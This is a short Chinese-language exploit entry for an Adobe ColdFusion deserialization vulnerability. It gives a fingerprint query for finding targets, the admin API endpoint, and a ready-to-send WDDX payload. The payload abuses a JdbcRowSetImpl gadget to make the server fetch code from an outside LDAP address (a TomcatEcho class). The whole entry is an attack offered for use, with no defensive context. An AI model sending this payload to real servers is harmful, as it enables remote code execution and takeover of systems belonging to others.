# AdobeColdFusion反序列化漏洞

AdobeColdFusion ｜ 反序列化 ｜ —
- **指纹**：`app="Adobe-ColdFusion"`
- **请求**：`POST /CFIDE/adminapi/base.cfc?method= HTTP/1.1`

**Payload**
```
argumentCollection=<wddxPacket+version%3d'1.0'><header/><data><struct+type%3d'xcom.sun.rowset.JdbcRowSetImplx'><var+name%3d'dataSourceName'><string>ldap://www.baidu.com/Basic/TomcatEcho</string></var><var+name%3d'autoCommit'><boolean+value%3d'true'/></var></struct></data></wddxPacket>
```
- **响应特征**：200